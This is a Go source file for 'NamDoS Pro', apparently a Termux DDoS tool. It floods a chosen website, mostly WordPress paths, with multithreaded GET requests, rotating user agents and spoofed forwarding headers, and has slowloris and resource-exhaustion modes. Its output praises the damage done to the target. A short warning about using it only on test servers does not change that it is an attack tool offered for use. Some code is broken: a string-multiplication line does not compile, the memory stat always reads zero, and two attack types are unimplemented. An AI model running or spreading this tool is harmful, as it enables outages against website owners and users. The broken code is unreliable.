package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// Attack statistics
type AttackStats struct {
	TotalRequests    int64
	SuccessfulRequests int64
	FailedRequests   int64
	StartTime        time.Time
	BytesSent        int64
	BytesReceived    int64
}

// Attack configuration
type AttackConfig struct {
	TargetURL      string
	Threads        int
	Duration       int
	Delay          int
	Timeout        int
	AttackType     string
	UserAgent      string
	KeepAlive      bool
	FollowRedirect bool
	MaxRedirects   int
	CustomHeaders  map[string]string
}

// Advanced NamDoS Pro
type NamDoSPro struct {
	config    AttackConfig
	stats     AttackStats
	stopChan  chan bool
	wg        sync.WaitGroup
	client    *http.Client
	userAgents []string
	attackURLs []string
}

// Initialize NamDoS Pro
func NewNamDoSPro() *NamDoSPro {
	return &NamDoSPro{
		stopChan: make(chan bool, 1),
		userAgents: []string{
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E148 Safari/604.1",
			"Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/109.0 Firefox/121.0",
			"Mozilla/5.0 (iPad; CPU OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E148 Safari/604.1",
		},
	}
}

// Print banner
func (n *NamDoSPro) printBanner() {
	banner := `
╔══════════════════════════════════════════════════════════════╗
║                    💀 NamDoS Pro v2.0 💀                    ║
║                Advanced DDoS Attack Tool                    ║
║                    Written in Golang                        ║
║                    For Termux Android                       ║
╚══════════════════════════════════════════════════════════════╝
	`
	fmt.Println(banner)
}

// Print menu
func (n *NamDoSPro) printMenu() {
	menu := `
🎯 Attack Powers:
1. 🟢 Light Attack      (1000 requests, 50 threads)
2. 🟡 Medium Attack     (5000 requests, 100 threads)
3. 🟠 Heavy Attack      (15000 requests, 200 threads)
4. 🔴 Extreme Attack    (30000 requests, 400 threads)
5. 💀 Nuclear Attack    (50000 requests, 600 threads)
6. ☢️  Apocalypse Attack (100000 requests, 1000 threads)
7. ⚙️  Custom Attack     (Your settings)

🎛️ Attack Types:
1. HTTP Flood Attack      - Multiple endpoints
2. Resource Exhaustion    - CPU, Memory, Disk I/O
3. Bandwidth Saturation   - High bandwidth usage
4. Mixed Attack           - All types combined
5. Slowloris Attack       - Slow connection attack
6. POST Flood Attack      - POST request flood
7. GET Flood Attack       - GET request flood

🔧 Advanced Features:
- Real-time statistics
- Multiple attack vectors
- Random user agents
- Custom headers
- SSL/TLS support
- Connection pooling
- Progress tracking
- ETA calculation
- Memory optimization
- CPU optimization

⚠️ WARNING: This tool will consume MASSIVE resources!
Use only on test servers or with explicit permission!
	`
	fmt.Println(menu)
}

// Setup HTTP client
func (n *NamDoSPro) setupClient() {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		MaxIdleConns:        n.config.Threads * 2,
		MaxIdleConnsPerHost: n.config.Threads,
		IdleConnTimeout:     30 * time.Second,
		DisableKeepAlives:   !n.config.KeepAlive,
	}

	n.client = &http.Client{
		Transport: transport,
		Timeout:   time.Duration(n.config.Timeout) * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= n.config.MaxRedirects {
				return http.ErrUseLastResponse
			}
			if !n.config.FollowRedirect {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}
}

// Generate attack URLs based on attack type
func (n *NamDoSPro) generateAttackURLs() {
	baseURL := strings.TrimSuffix(n.config.TargetURL, "/")
	
	switch n.config.AttackType {
	case "http_flood":
		n.attackURLs = []string{
			baseURL + "/",
			baseURL + "/wp-admin/",
			baseURL + "/wp-content/",
			baseURL + "/wp-includes/",
			baseURL + "/wp-json/",
			baseURL + "/sitemap.xml",
			baseURL + "/robots.txt",
			baseURL + "/favicon.ico",
			baseURL + "/wp-login.php",
			baseURL + "/admin/",
			baseURL + "/login/",
			baseURL + "/api/",
		}
	case "resource_exhaustion":
		n.attackURLs = []string{
			baseURL + "/wp-content/uploads/",
			baseURL + "/wp-content/themes/",
			baseURL + "/wp-content/plugins/",
			baseURL + "/wp-includes/js/",
			baseURL + "/wp-includes/css/",
			baseURL + "/wp-admin/css/",
			baseURL + "/wp-admin/js/",
			baseURL + "/wp-content/uploads/2024/",
			baseURL + "/wp-content/uploads/2023/",
		}
	case "bandwidth_saturation":
		n.attackURLs = []string{
			baseURL + "/wp-content/uploads/",
			baseURL + "/wp-content/themes/",
			baseURL + "/wp-content/plugins/",
			baseURL + "/wp-includes/",
			baseURL + "/wp-admin/",
			baseURL + "/wp-content/",
		}
	case "mixed_attack":
		n.attackURLs = []string{
			baseURL + "/",
			baseURL + "/wp-admin/",
			baseURL + "/wp-content/uploads/",
			baseURL + "/wp-content/themes/",
			baseURL + "/wp-content/plugins/",
			baseURL + "/wp-json/wp/v2/posts",
			baseURL + "/wp-login.php",
			baseURL + "/sitemap.xml",
			baseURL + "/robots.txt",
			baseURL + "/favicon.ico",
		}
	default:
		n.attackURLs = []string{baseURL + "/"}
	}
}

// Single request function
func (n *NamDoSPro) makeRequest() {
	url := n.attackURLs[rand.Intn(len(n.attackURLs))]
	
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		atomic.AddInt64(&n.stats.FailedRequests, 1)
		atomic.AddInt64(&n.stats.TotalRequests, 1)
		return
	}

	// Set random user agent
	req.Header.Set("User-Agent", n.userAgents[rand.Intn(len(n.userAgents))])
	
	// Set custom headers
	for key, value := range n.config.CustomHeaders {
		req.Header.Set(key, value)
	}

	// Set additional headers for better performance
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Pragma", "no-cache")

	resp, err := n.client.Do(req)
	if err != nil {
		atomic.AddInt64(&n.stats.FailedRequests, 1)
		atomic.AddInt64(&n.stats.TotalRequests, 1)
		return
	}
	defer resp.Body.Close()

	// Read response body to consume bandwidth
	body, err := io.ReadAll(resp.Body)
	if err == nil {
		atomic.AddInt64(&n.stats.BytesReceived, int64(len(body)))
	}

	atomic.AddInt64(&n.stats.TotalRequests, 1)
	if resp.StatusCode >= 200 && resp.StatusCode < 400 {
		atomic.AddInt64(&n.stats.SuccessfulRequests, 1)
	} else {
		atomic.AddInt64(&n.stats.FailedRequests, 1)
	}
}

// Attack worker
func (n *NamDoSPro) attackWorker() {
	defer n.wg.Done()
	
	for {
		select {
		case <-n.stopChan:
			return
		default:
			n.makeRequest()
			
			if n.config.Delay > 0 {
				time.Sleep(time.Duration(n.config.Delay) * time.Millisecond)
			}
		}
	}
}

// Slowloris attack
func (n *NamDoSPro) slowlorisAttack() {
	defer n.wg.Done()
	
	// This is a simplified slowloris implementation
	// In a real implementation, you would maintain many slow connections
	for {
		select {
		case <-n.stopChan:
			return
		default:
			n.makeRequest()
			time.Sleep(10 * time.Second) // Slow requests
		}
	}
}

// Start attack
func (n *NamDoSPro) startAttack() {
	fmt.Printf("\n💀 Starting NamDoS Pro Attack on: %s\n", n.config.TargetURL)
	fmt.Printf("🎯 Threads: %d\n", n.config.Threads)
	fmt.Printf("⏱️ Duration: %d seconds\n", n.config.Duration)
	fmt.Printf("🎛️ Attack Type: %s\n", n.config.AttackType)
	fmt.Printf("🕐 Start Time: %s\n", time.Now().Format("2006-01-02 15:04:05"))
	fmt.Println("=" * 80)

	n.stats.StartTime = time.Now()
	n.generateAttackURLs()
	n.setupClient()

	// Start attack workers
	for i := 0; i < n.config.Threads; i++ {
		n.wg.Add(1)
		if n.config.AttackType == "slowloris_attack" {
			go n.slowlorisAttack()
		} else {
			go n.attackWorker()
		}
	}

	// Start statistics display
	go n.displayStats()

	// Wait for duration or stop signal
	if n.config.Duration > 0 {
		time.Sleep(time.Duration(n.config.Duration) * time.Second)
	} else {
		// Wait indefinitely until stopped
		select {}
	}

	n.stopAttack()
}

// Stop attack
func (n *NamDoSPro) stopAttack() {
	fmt.Println("\n🛑 Stopping attack...")
	close(n.stopChan)
	n.wg.Wait()
	n.showFinalResults()
}

// Display real-time statistics
func (n *NamDoSPro) displayStats() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-n.stopChan:
			return
		case <-ticker.C:
			n.printStats()
		}
	}
}

// Print statistics
func (n *NamDoSPro) printStats() {
	elapsed := time.Since(n.stats.StartTime)
	successRate := float64(n.stats.SuccessfulRequests) / float64(n.stats.TotalRequests) * 100
	rps := float64(n.stats.TotalRequests) / elapsed.Seconds()
	
	fmt.Printf("\r💀 Attacks: %d | ✅ Success: %d | ❌ Failed: %d | 📊 Rate: %.1f%% | ⚡ RPS: %.1f | ⏱️ Time: %.1fs | 📊 Memory: %d MB",
		n.stats.TotalRequests,
		n.stats.SuccessfulRequests,
		n.stats.FailedRequests,
		successRate,
		rps,
		elapsed.Seconds(),
		runtime.MemStats{}.Alloc/1024/1024)
}

// Show final results
func (n *NamDoSPro) showFinalResults() {
	elapsed := time.Since(n.stats.StartTime)
	successRate := float64(n.stats.SuccessfulRequests) / float64(n.stats.TotalRequests) * 100
	rps := float64(n.stats.TotalRequests) / elapsed.Seconds()
	
	fmt.Printf("\n\n%s\n", strings.Repeat("=", 80))
	fmt.Println("💀 NamDoS Pro Attack Completed!")
	fmt.Printf("%s\n", strings.Repeat("=", 80))
	fmt.Printf("🎯 Total Attacks: %d\n", n.stats.TotalRequests)
	fmt.Printf("✅ Successful: %d\n", n.stats.SuccessfulRequests)
	fmt.Printf("❌ Failed: %d\n", n.stats.FailedRequests)
	fmt.Printf("📊 Success Rate: %.1f%%\n", successRate)
	fmt.Printf("⚡ Requests/Second: %.1f\n", rps)
	fmt.Printf("⏱️ Total Time: %.1fs\n", elapsed.Seconds())
	fmt.Printf("📊 Data Sent: %.2f MB\n", float64(n.stats.BytesSent)/1024/1024)
	fmt.Printf("📊 Data Received: %.2f MB\n", float64(n.stats.BytesReceived)/1024/1024)
	fmt.Printf("🕐 End Time: %s\n", time.Now().Format("2006-01-02 15:04:05"))
	fmt.Printf("%s\n", strings.Repeat("=", 80))
	
	if successRate >= 95 {
		fmt.Println("✅ Excellent! The target handled the attack very well.")
	} else if successRate >= 80 {
		fmt.Println("⚠️ Good performance, but the target showed some stress.")
	} else if successRate >= 50 {
		fmt.Println("💀 Good! The target is struggling under the attack.")
	} else {
		fmt.Println("☠️ Perfect! The target is heavily impacted by the attack.")
	}
}

// Quick test function
func (n *NamDoSPro) quickTest(targetURL string) {
	fmt.Printf("\n🧪 Quick Test on: %s\n", targetURL)
	fmt.Println(strings.Repeat("=", 50))
	
	start := time.Now()
	resp, err := http.Get(targetURL)
	elapsed := time.Since(start)
	
	if err != nil {
		fmt.Printf("❌ Test failed: %v\n", err)
		return
	}
	defer resp.Body.Close()
	
	fmt.Printf("✅ Test completed in %.0fms\n", float64(elapsed.Nanoseconds())/1e6)
	fmt.Printf("📊 Status Code: %d\n", resp.StatusCode)
	fmt.Printf("📏 Content Length: %d bytes\n", resp.ContentLength)
	fmt.Printf("🔒 Server: %s\n", resp.Header.Get("Server"))
	
	if elapsed.Milliseconds() < 1000 {
		fmt.Println("🚀 Excellent! Target is very fast.")
	} else if elapsed.Milliseconds() < 3000 {
		fmt.Println("⚠️ Good speed, but could be better.")
	} else {
		fmt.Println("🐌 Slow response time. Perfect for DDoS testing!")
	}
}

// Setup signal handlers
func (n *NamDoSPro) setupSignalHandlers() {
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	
	go func() {
		<-c
		fmt.Println("\n\n🛑 Attack stopped by user!")
		n.stopAttack()
		os.Exit(0)
	}()
}

// Main function
func main() {
	var (
		targetURL = flag.String("site", "", "Target URL to attack")
		threads   = flag.Int("threads", 100, "Number of threads")
		duration  = flag.Int("duration", 0, "Attack duration in seconds (0 = infinite)")
		delay     = flag.Int("delay", 0, "Delay between requests in milliseconds")
		timeout   = flag.Int("timeout", 30, "Request timeout in seconds")
		attackType = flag.String("type", "mixed_attack", "Attack type")
		quickTest = flag.Bool("test", false, "Quick test mode")
	)
	flag.Parse()

	namdos := NewNamDoSPro()
	namdos.printBanner()

	if *quickTest {
		if *targetURL == "" {
			fmt.Println("❌ Please provide target URL with -site flag")
			os.Exit(1)
		}
		namdos.quickTest(*targetURL)
		return
	}

	if *targetURL == "" {
		namdos.printMenu()
		
		// Interactive mode
		fmt.Print("\n🎯 Select attack power (1-7): ")
		var choice int
		fmt.Scanln(&choice)
		
		switch choice {
		case 1:
			*threads = 50
			*duration = 60
		case 2:
			*threads = 100
			*duration = 120
		case 3:
			*threads = 200
			*duration = 180
		case 4:
			*threads = 400
			*duration = 300
		case 5:
			*threads = 600
			*duration = 600
		case 6:
			*threads = 1000
			*duration = 1200
		case 7:
			fmt.Print("Enter threads: ")
			fmt.Scanln(threads)
			fmt.Print("Enter duration (seconds, 0 = infinite): ")
			fmt.Scanln(duration)
		default:
			fmt.Println("❌ Invalid choice!")
			os.Exit(1)
		}
		
		fmt.Print("🎯 Enter target URL: ")
		fmt.Scanln(targetURL)
		
		fmt.Print("🎛️ Select attack type (1-7): ")
		var typeChoice int
		fmt.Scanln(&typeChoice)
		
		switch typeChoice {
		case 1:
			*attackType = "http_flood"
		case 2:
			*attackType = "resource_exhaustion"
		case 3:
			*attackType = "bandwidth_saturation"
		case 4:
			*attackType = "mixed_attack"
		case 5:
			*attackType = "slowloris_attack"
		case 6:
			*attackType = "post_flood"
		case 7:
			*attackType = "get_flood"
		default:
			*attackType = "mixed_attack"
		}
	}

	// Configure attack
	namdos.config = AttackConfig{
		TargetURL:      *targetURL,
		Threads:        *threads,
		Duration:       *duration,
		Delay:          *delay,
		Timeout:        *timeout,
		AttackType:     *attackType,
		KeepAlive:      true,
		FollowRedirect: true,
		MaxRedirects:   10,
		CustomHeaders: map[string]string{
			"X-Forwarded-For": "127.0.0.1",
			"X-Real-IP":       "127.0.0.1",
		},
	}

	// Setup signal handlers
	namdos.setupSignalHandlers()

	// Start attack
	namdos.startAttack()
}
